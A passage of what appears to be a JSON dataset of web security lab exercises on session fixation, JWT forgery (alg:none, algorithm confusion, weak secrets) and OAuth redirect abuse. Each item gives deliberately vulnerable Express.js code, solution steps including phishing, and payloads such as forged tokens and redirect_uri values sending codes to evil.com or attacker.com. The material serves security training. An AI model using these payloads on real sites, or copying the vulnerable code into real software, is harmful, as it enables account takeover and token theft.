    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': { password: 'password123', session: null } }; app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; if (users[username] && users[username].password === password) { users[username].session = sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', users[username].session); res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.sessionId; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send(`Account details for ${user}`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?username=carlos&password=password123&sessionId=attacker123",
      "/login?sessionId=attacker123",
      "Cookie: sessionId=attacker123"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login workflow",
    "Lab Description": "This lab's session management mechanism is flawed and allows session fixation attacks. The application issues session cookies prior to authentication and fails to assign new tokens upon successful login. To solve: Hijack Carlos's session by fixing the session identifier before he logs in, then access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the session cookie issued by the server.",
      "Send a crafted phishing email to Carlos or use social engineering to make him reuse the provided session ID for login.",
      "After Carlos authenticates using the fixed session ID, reuse the same session cookie in your own browser or API client.",
      "Confirm that you are now logged in as Carlos without providing any credentials.",
      "Visit /my-account while using the fixed session cookie to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecret123' }; app.get('/login', (req, res) => { let sessionID = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionID); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send('Welcome ' + user); } else { res.send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: sessionid=attackersession123;",
      "Use phishing email to send: https://victim.site/login with sessionid=attackersession123",
      "Reuse sessionid=attackersession123 after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token validation",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for session authentication but fails to enforce the correct cryptographic algorithm. An attacker can manipulate the token header to use 'none' as the algorithm and forge a valid session token. To solve: Forge a valid admin JWT and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT during a login session using Burp Suite or OWASP ZAP.",
      "Modify the JWT header to { \"alg\": \"none\", \"typ\": \"JWT\" } and remove the signature portion.",
      "Craft a payload like { \"username\": \"admin\" } and base64-encode the header and payload.",
      "Send the forged JWT as a Bearer token in the Authorization header to /admin.",
      "Verify successful access to the admin panel to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'insecure-secret'; app.get('/login', (req, res) => { const username = req.query.username; const token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer <header.payload.>",
      "Replace JWT in Cookie or Auth header with none-alg variant"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login flow",
    "Lab Description": "This lab's OAuth integration incorrectly trusts the 'state' parameter without proper validation. An attacker can intercept and modify this value to hijack authorization codes during the OAuth redirection. To solve: Manipulate the OAuth 'state' parameter to capture a valid authorization code and log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the OAuth login request with Burp Suite and observe the 'state' parameter in the redirect URL.",
      "Modify the 'state' parameter to a predictable or controlled value and replay the request.",
      "Use Burp Collaborator or a controlled server to catch the authorization code sent via redirect.",
      "Exchange the intercepted authorization code for an access token using Postman or curl.",
      "Submit the token to /my-account endpoint to confirm the hijack and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, state } = req.query; if (!state || !code) return res.status(400).send('Invalid request'); res.cookie('session_token', code); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session_token; if (token === 'carlos_auth_code') { res.send('Welcome Carlos!'); } else { res.send('Unauthorized'); } }); app.listen(5000);",
    "payloads": [
      "https://target.site/auth/callback?code=carlos_auth_code&state=attacker",
      "Manipulate state to match known value: attacker123",
      "OAuth authorization code interception using Burp Collaborator"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
    "Lab Description": "This lab's authentication system uses JWTs for session management. The server uses the 'alg' field from the incoming token without proper validation, making it vulnerable to algorithm confusion. The application fails to enforce the intended HS256 signature verification when decoding JWTs, allowing attackers to switch the algorithm to 'none' and bypass signature verification entirely. To solve: Forge a valid session token for the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid login request using Burp Suite and capture the JWT from the Authorization header.",
      "Use jwt.io or a custom script to decode the JWT and note the 'alg' value is 'HS256'.",
      "Modify the header's 'alg' field to 'none' and remove the signature section entirely.",
      "Set the payload 'sub' to 'carlos' and re-encode the JWT without a signature.",
      "Replay the modified token using Postman in an Authorization header and access /my-account to confirm successful authentication."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && (!payload.header.alg || payload.header.alg === 'none' || jwt.verify(token, SECRET_KEY))) { res.send(`Welcome, ${payload.payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running at http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
      "{\"alg\":\"none\",\"typ\":\"JWT\"}.{ \"sub\":\"carlos\" }."
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in authorization flow",
    "Lab Description": "The application implements OAuth 2.0 for single sign-on (SSO) but lacks proper validation of the redirect_uri parameter. An attacker can manipulate this parameter to hijack an OAuth authorization code meant for another user. The application incorrectly trusts any user-supplied redirect_uri pointing to the same domain. To solve: Trick the application into sending an OAuth code for the user 'carlos' to your controlled endpoint, then exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate the OAuth login process and intercept the request containing the redirect_uri parameter.",
      "Modify the redirect_uri parameter to point to your controlled endpoint: https://attacker.com/callback.",
      "Send the phishing link to the victim (simulated in lab) and wait for the authorization code to be sent to your server.",
      "Use Postman to send a POST request to the OAuth provider's token endpoint with the stolen code and retrieve Carlos's access token.",
      "Replay the token against the /my-account API to access Carlos's protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri, code } = req.query; if (redirect_uri && code) { res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid-oauth-token-for-carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running at http://localhost:4000'));",
    "payloads": [
      "https://attacker.com/callback",
      "https://attacker.com/oauth/code-stealer",
      "https://attacker.com/evil?code=intercepted-code"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab's session management logic fails to regenerate session tokens upon successful login. Attackers can fixate their own session ID and later reuse it to hijack authenticated user sessions. The application issues the session cookie before verifying user credentials, allowing the attacker to trick a victim into using the attacker's predefined session token. To solve: Fixate your session ID, trick the application into authenticating as Carlos, then reuse the session ID to access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to initiate a GET request to /login and capture the Set-Cookie header issuing a session ID.",
      "Send this session ID to the victim (simulated scenario) and wait for them to log in.",
      "Reattach the fixed session ID to your requests in Burp or Postman.",
      "Access the /my-account endpoint using the fixed session ID to verify that you're now logged in as 'carlos'.",
      "Confirm successful exploitation when Carlos's account details appear."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'hunter2', 'admin': 'adminpass' }; app.get('/login', (req, res) => { if (!req.cookies.session) { res.cookie('session', Math.random().toString(36).substr(2)); } res.send('Please log in.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-for-carlos') { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
    "payloads": [
      "Cookie: session=fixed-session-for-carlos",
      "Set-Cookie: session=fixed-session-for-carlos",
      "fixed-session-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authentication flow",
    "Lab Description": "This lab's authentication mechanism is vulnerable to JWT algorithm confusion. The application accepts JSON Web Tokens for authentication but fails to enforce the expected signing algorithm, allowing an attacker to switch from asymmetric RS256 to symmetric HS256. The application does not validate the secret when HS256 is used. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture an authenticated JWT token using Burp Suite's Proxy tab after logging in as your own user.",
      "Inspect the token header and notice the 'alg' parameter is set to RS256. Modify it to HS256 and set the signature part to an HMAC using the public key as the secret.",
      "Use a JWT crafting tool like jwt.io or Burp Suite's Decoder to craft a forged token for username 'carlos'.",
      "Replace your original JWT with the forged one in an authenticated request to /my-account.",
      "If successful, the page will display Carlos's account data, confirming the token bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account details for ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"} | Payload: {\"username\":\"carlos\"} | Signature: HMAC(publicKey, header.payload)",
      "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ.[HMAC signature]"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure cookie handling",
    "Lab Description": "This lab is vulnerable to session fixation due to improper handling of session cookies. The application accepts user-supplied session tokens and fails to regenerate them upon authentication. An attacker can set a known session ID before login, which will persist across privilege escalation. To solve: fix a session ID and log in as the victim user 'carlos' using the same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, intercept the GET /login request and set a predictable session ID via Cookie header (e.g., PHPSESSID=attackerfixedid).",
      "Use the victim's credentials during login and observe that the session token remains unchanged after successful authentication.",
      "Reuse the fixed session ID to access /my-account directly using the same token.",
      "Confirm access to Carlos's profile with the fixed session ID.",
      "Use ZAP to confirm the same session persists across multiple requests, validating fixation success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.get('/login', (req, res) => { res.cookie('session', req.cookies.session || Math.random().toString(36).substring(2)); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { res.send(`Account data for session ${req.cookies.session}`); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attackerfixedid",
      "Login POST: username=carlos&password=qwerty123 with Cookie: session=attackerfixedid",
      "GET /my-account with Cookie: session=attackerfixedid"
    ]
  },
  {
    "Lab scenario": "OAuth token misconfiguration in third-party login",
    "Lab Description": "This lab's OAuth login flow improperly trusts the 'sub' claim from a third-party provider without validating issuer or audience fields, allowing impersonation of other users. To solve: forge a valid ID Token with 'sub' set to Carlos and log in via OAuth to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a legitimate OAuth authentication flow from the provider for your own account.",
      "Decode the JWT token using jwt.io and analyze the 'sub' field which defines the user identity.",
      "Manually craft a JWT with the 'sub' claim set to 'carlos' while reusing the same header and signing key (if known or guessable).",
      "Submit the forged ID Token to the application’s OAuth callback endpoint to complete login as Carlos.",
      "Confirm by accessing the /my-account endpoint to verify account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const idToken = req.body.id_token; const decoded = jwt.decode(idToken); if (!decoded || !decoded.sub) return res.status(401).send('Invalid ID token'); res.send(`Logged in as ${decoded.sub}`); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"} | Payload: {\"sub\":\"carlos\"} | Signature: HMAC(secret, header.payload)",
      "eyJhbGciOiAiSFMyNTYifQ.eyJzdWIiOiAiY2FybG9zIn0.[Valid HMAC signature]"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-Login Cookie Reuse",
    "Lab Description": "The login flow of this web app allows a pre-authenticated session ID to persist after a successful login, leading to session fixation. The application does not regenerate session identifiers after login, allowing attackers to set a session beforehand. To solve: Hijack Carlos's session using a pre-set session ID cookie.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Start Burp Suite and intercept the initial GET /login request to the site.",
      "Note the Set-Cookie header for session ID and manually fix it to a predictable value like 'sessionid=attacker123'.",
      "Send the crafted login link to Carlos (simulated by switching users) with the preset session ID cookie.",
      "Log in as Carlos using known credentials from a separate session but using the 'attacker123' session ID.",
      "Reuse the same session ID cookie in a browser and access /my-account to verify hijack success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Welcome, ' + req.session.user); else res.status(403).send('Not authorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "GET /login HTTP/1.1 with pre-injected sessionid",
      "POST /login with valid credentials while sessionid=attacker123 is set"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
    "Lab Description": "The app uses JWTs for session management but does not enforce a strong algorithm check. It accepts unsigned tokens if the 'alg' header is modified to 'none'. The application verifies JWTs based on the 'alg' field without checking signature integrity. To solve: Forge an admin token using alg:none and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in as a regular user and capture the Authorization: Bearer token using Burp Suite.",
      "Use jwt.io or Postman to decode the JWT and examine the 'alg' header.",
      "Craft a new token with the payload { \"username\": \"carlos\", \"role\": \"admin\" } and header { \"alg\": \"none\" }, without a signature.",
      "Inject the crafted JWT into the Authorization header.",
      "Send a GET /admin-dashboard request using the unsigned JWT to confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secretKey = 'supersecret'; app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, secretKey, { algorithms: [payload.header.alg] }); if (verified && verified.role === 'admin') { res.send('Welcome to admin dashboard'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "Header: { \"alg\": \"none\" }",
      "Payload: { \"username\": \"carlos\", \"role\": \"admin\" }",
      "JWT: [base64url(header)].[base64url(payload)]. (no signature)",
      "Authorization: Bearer [forged-token]"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Leakage in Redirect URL",
    "Lab Description": "The web application uses the OAuth 2.0 implicit flow and allows open redirection in the redirect_uri parameter. This enables token leakage through an attacker-controlled URL. The application trusts user-controlled redirect URIs without validating the domain. To solve: Leak Carlos's token to an attacker domain and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect the OAuth login process and locate the 'redirect_uri' parameter in the authorization request.",
      "Craft a malicious URL with redirect_uri pointing to an attacker-controlled site (e.g., https://evil.com/capture).",
      "Send the malicious OAuth link to Carlos (simulate by visiting the link yourself with Carlos logged in).",
      "Capture the access_token fragment in the redirect to https://evil.com/capture#access_token=... using a local HTTP server or webhook.site.",
      "Replay the stolen token in the Authorization: Bearer header to access /user-profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/user-profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-oauth-token') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "https://vulnerable.com/auth?redirect_uri=https://evil.com/capture",
      "Authorization: Bearer carlos-oauth-token",
      "Access_token extracted from redirect URI fragment",
      "OAuth implicit flow token replay"
    ]
  },
  {
    "Lab scenario": "Session fixation in URL parameter during login",
    "Lab Description": "The application implements a flawed session handling mechanism that accepts user-provided session IDs via URL query parameters. When users log in, the session ID from the URL is reused, allowing attackers to predefine a session and force victims to use it. To solve: Hijack Carlos's session by crafting a valid login link that fixes the session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the login process and observe that the session ID can be passed via GET /login?session=abc123",
      "Send the request to Burp Repeater and confirm that the application sets the provided session ID in the Set-Cookie header after login",
      "Craft a login URL with a fixed session ID and send it to the victim (Carlos)",
      "Wait for Carlos to log in using the malicious session ID",
      "Access /my-account using the same session ID and verify that you’re logged in as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { if (req.query.session) { req.sessionID = req.query.session; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "/login?session=abc123",
      "abc123",
      "GET /my-account Cookie: connect.sid=abc123"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'none' algorithm",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication. It trusts the 'alg' header of incoming tokens without validation. If the algorithm is set to 'none', the server skips signature verification. To solve: Forge a JWT token with 'none' algorithm to gain access to Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT token after login",
      "Decode the JWT token using jwt.io or Burp JWT editor",
      "Modify the payload to impersonate user 'carlos' and set 'alg' to 'none' in the header",
      "Remove the signature completely and base64 encode the new token",
      "Send a request to /my-account with Authorization: Bearer [forged-token] and verify access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Token: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect",
    "Lab Description": "The application uses OAuth for authentication but fails to validate the redirect_uri parameter strictly. An attacker can manipulate this parameter to redirect the OAuth authorization code to their own server and steal access tokens. To solve: Capture Carlos's access token by injecting a malicious redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and intercept the OAuth flow",
      "Note the request to /auth?redirect_uri=https://example.com/callback",
      "Modify the redirect_uri to point to your attacker server (e.g., https://evil.com/code-catcher)",
      "Host a temporary server (e.g., using ngrok or python3 -m http.server) to receive the token/code",
      "Send the malicious link to Carlos. When he logs in, intercept the token on your server",
      "Use the stolen access token to access /my-account as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'abc123';  res.redirect(`${redirectUri}?code=${code}`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post('https://oauth.provider.com/token', { form: { code, client_id: '123', client_secret: 'xyz' } }, (err, resp, body) => { res.send(`Access granted with token: ${body}`); }); }); app.listen(4000);",
    "payloads": [
      "/auth?redirect_uri=https://evil.com/capture",
      "GET https://evil.com/capture?code=abc123",
      "Use token abc123 at /my-account"
    ]
  },
  {
    "Lab scenario": "REST API JWT authentication bypass via weak secret",
    "Lab Description": "The application uses JWT tokens to authenticate API users. It signs tokens using a weak secret and does not validate the 'alg' claim properly. The application exposes an endpoint that echoes back the token payload for debugging. To solve: craft a forged JWT token that grants admin access and use it to access the protected /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a login request and capture the JWT token in the response.",
      "Use jwt.io or Burp Suite's JWT extension to decode and analyze the token structure and signing algorithm.",
      "Use a tool like `jwt-cracker` or `John the Ripper` to brute-force the weak secret (e.g., 'secret', 'admin123').",
      "Modify the payload to set 'role':'admin', then re-sign using the cracked secret and 'HS256' algorithm.",
      "Send the forged token in an Authorization: Bearer header to /admin and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'admin123'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } });",
    "payloads": [
      "HS256 token with header: {\"alg\":\"HS256\"}, payload: {\"username\":\"carlos\",\"role\":\"admin\"}, signed with 'admin123'",
      "jwt.io-generated token using known secret 'secret'",
      "Manually forged token with cracked secret using PyJWT"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Access Token Leak in Referer Header",
    "Lab Description": "The application uses the OAuth 2.0 Implicit flow for authentication. After login, it redirects the user to a third-party domain while leaking the access token in the Referer header. To solve: intercept and steal Carlos’s OAuth access token via a malicious redirect URI, then use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the redirect URL after OAuth login and confirm token is returned in URL fragment (#access_token).",
      "Register a new OAuth client with a redirect_uri to your attacker domain (e.g., https://evil.com).",
      "Modify the /authorize request to use the attacker redirect_uri and send link to Carlos.",
      "When Carlos logs in, his browser sends the access_token in the Referer header to evil.com.",
      "Use the stolen token in Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') { res.send('Carlos Account Access'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://evil.com#access_token=access-token-carlos",
      "OAuth authorize URL with redirect_uri=https://evil.com",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login endpoint",
    "Lab Description": "The application generates a session ID in a cookie before login and fails to regenerate it after authentication. The session ID is predictable and can be fixed prior to victim login. To solve: set a session ID for the victim, trick them into logging in, then reuse the same ID to access their session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or browser to set a session cookie before login (e.g., sessionid=1234carlos).",
      "Send a phishing link to Carlos with the pre-set sessionid=1234carlos cookie.",
      "After Carlos logs in, revisit the site and reuse the same sessionid to access his authenticated session.",
      "Access /my-account while presenting the fixed sessionid.",
      "Verify Carlos’s account content is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid] === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sessionid=1234carlos",
      "Pre-login fixed session ID and reuse after login",
      "Phishing link that sets session cookie before login"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization header handling",
    "Lab Description": "This lab involves a vulnerable REST API that authenticates users based on JWTs passed via the Authorization header. The server does not verify the token signature. The application decodes the token and grants access based solely on the 'role' claim. To solve: craft a tampered JWT with elevated privileges to access the /admin/data endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request to /user/profile with a valid JWT and inspect the Authorization: Bearer <JWT> header.",
      "Decode the JWT using jwt.io and inspect the payload claims.",
      "Observe that the 'alg' in the header is set to 'HS256', and the signature isn't verified server-side.",
      "Modify the JWT payload to { \"user\": \"carlos\", \"role\": \"admin\" } and change 'alg' to 'none'.",
      "Remove the signature and send the tampered token in the Authorization header to /admin/data using Postman to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Admins only'); res.send('Sensitive admin data'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in authorization code grant exchange",
    "Lab Description": "This lab uses the OAuth 2.0 authorization code grant flow. The application does not validate the `redirect_uri` during the token exchange, allowing an attacker to intercept the authorization code. To solve: hijack the OAuth flow to gain an access token for Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth flow when logging in via the third-party provider.",
      "Capture the authorization code sent to your redirect_uri.",
      "Send a crafted POST request to /oauth/token using Carlos's authorization code and your own redirect_uri.",
      "Observe that the server does not validate the redirect_uri and issues you an access token.",
      "Use the stolen access token to access Carlos’s protected profile endpoint: /user/carlos/profile"
    ],
    "Vulnerability name": "Authentication",
